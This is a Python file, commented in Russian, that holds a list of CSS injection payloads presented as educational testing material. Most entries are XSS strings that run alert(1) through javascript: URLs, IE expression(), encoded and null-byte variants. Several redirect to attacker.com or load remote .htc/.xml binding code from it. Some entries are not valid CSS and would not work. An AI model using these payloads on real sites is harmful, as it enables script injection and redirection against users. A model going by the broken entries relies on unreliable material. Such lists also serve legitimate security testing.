"""
CSS Injection Payload коллекция для тестирования уязвимостей
Используется только в образовательных целях на собственных ресурсах
"""

CSS_INJECTION_PAYLOADS = [
    # Базовые CSS инъекции
    '";alert(1);//',
    '";prompt(1);//',
    '";window.location="http://attacker.com";//',
    
    # CSS background-image с javascript
    'background-image: url(javascript:alert(1))',
    'background: url(javascript:alert(1))',
    'background-image: url("javascript:alert(1)")',
    'background-image: url(\'javascript:alert(1)\')',
    
    # CSS behavior (IE специфичные)
    'behavior: url(http://attacker.com/xss.htc)',
    'behavior: url(#xss)',
    '-moz-binding: url(http://attacker.com/xss.xml#xss)',
    
    # CSS expression (IE специфичные)
    'width: expression(alert(1))',
    'height: expression(alert(1))',
    'color: expression(alert(1))',
    'width: expression(window.location="http://attacker.com")',
    
    # CSS import с javascript
    '@import url("javascript:alert(1)")',
    '@import "javascript:alert(1)"',
    '@import url(javascript:alert(1))',
    
    # CSS с event handlers в селекторах
    '*{background:url("javascript:alert(1)")}',
    'body{background:url("javascript:alert(1)")}',
    'div{background:url("javascript:alert(1)")}',
    
    # CSS content property
    'content: url(javascript:alert(1))',
    'content: "javascript:alert(1)"',
    
    # CSS filter (старые версии IE)
    'filter: alpha(opacity=100) url(javascript:alert(1))',
    'filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=javascript:alert(1))',
    
    # CSS с data: URI
    'background: url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)',
    'background-image: url(data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    
    # Побег из CSS комментариев
    '*/ background: url(javascript:alert(1)) /*',
    '*/}body{background:url(javascript:alert(1))}/*',
    
    # CSS селекторы с операторами
    '[onclick*="alert"]{display:block}',
    '[data-x="alert(1)"]{width:1px}',
    
    # Закодированные CSS
    'background-image: url(&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;)',
    'background: url(\\6a\\61\\76\\61\\73\\63\\72\\69\\70\\74\\3a\\61\\6c\\65\\72\\74\\28\\31\\29)',
    
    # CSS с атрибутом style содержащем script
    'style="width: expression(alert(1))"',
    'style="background: url(javascript:alert(1))"',
    'style="display: url(javascript:alert(1))"',
    
    # CSS @font-face с javascript
    '@font-face{font-family:myfont;src:url(javascript:alert(1))}',
    
    # CSS с перенесением строк
    'back\nground-image: url(javascript:alert(1))',
    'back\\aground-image: url(javascript:alert(1))',
    
    # CSS с символами контроля
    'background-image: url(&#x06a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29)',
    
    # CSS медиа-запросы
    '@media screen { body { background: url(javascript:alert(1)) } }',
    '@media print { * { background: url(javascript:alert(1)) } }',
    
    # CSS селекторы с escaped символами
    'body\2f\2a { background: url(javascript:alert(1)) }',
    'body /**/{ background: url(javascript:alert(1)) }',
    
    # CSS с нулевыми байтами
    'background-image: url(java%00script:alert(1))',
    'background: url(java\x00script:alert(1))',
    
    # CSS animation/keyframes
    '@keyframes xss { 0% { background: url(javascript:alert(1)) } }',
    'animation: xss 1s infinite',
    
    # CSS с CSS variables
    '--xss: url(javascript:alert(1)); background-image: var(--xss)',
    
    # CSS с calc()
    'width: calc(1px + url(javascript:alert(1)))',
    'height: calc(100% + url(javascript:alert(1)))',
    
    # CSS pointer-events bypass
    'pointer-events: none; background: url(javascript:alert(1))',
    
    # CSS -webkit специфичные
    '-webkit-mask-image: url(javascript:alert(1))',
    '-webkit-mask: url(javascript:alert(1))',
    '-webkit-background-image: url(javascript:alert(1))',
    
    # CSS -moz специфичные
    '-moz-mask-image: url(javascript:alert(1))',
    '-moz-user-select: url(javascript:alert(1))',
    
    # CSS с стилями шрифтов
    'font-family: url(javascript:alert(1))',
    'src: url(javascript:alert(1))',
    
    # CSS позиционирование с URL
    'background-position: url(javascript:alert(1))',
    'background-repeat: url(javascript:alert(1))',
    
    # CSS outline и border
    'outline-image: url(javascript:alert(1))',
    'border-image: url(javascript:alert(1))',
    
    # CSS перемещение логотипов
    'list-style: url(javascript:alert(1))',
    'list-style-image: url(javascript:alert(1))',
    'marker-offset: url(javascript:alert(1))',
    
    # CSS с тремя точками
    '...{background:url(javascript:alert(1))}',
    
    # CSS с экранированием точек
    '.\\2e alert\\28 1 \\29{color:red}',
    
    # CSS без точки с запятой
    'background:url(javascript:alert(1))',
    'width:expression(alert(1))',
    
    # CSS множественные свойства в одной строке
    'background:url(javascript:alert(1));color:red;width:100px',
    
    # CSS с HTML сущностями
    'background-image: url(&quot;javascript:alert(1)&quot;)',
    'background-image: url(&#34;javascript:alert(1)&#34;)',
    
    # CSS с пробельными символами
    'background-image:  url(  javascript:alert(1)  )',
    'background-image:\turl(\tjavascript:alert(1)\t)',
]


def get_css_payloads():
    """Возвращает список CSS injection payload-ов"""
    return CSS_INJECTION_PAYLOADS


def get_css_payloads_count():
    """Возвращает количество CSS payload-ов"""
    return len(CSS_INJECTION_PAYLOADS)
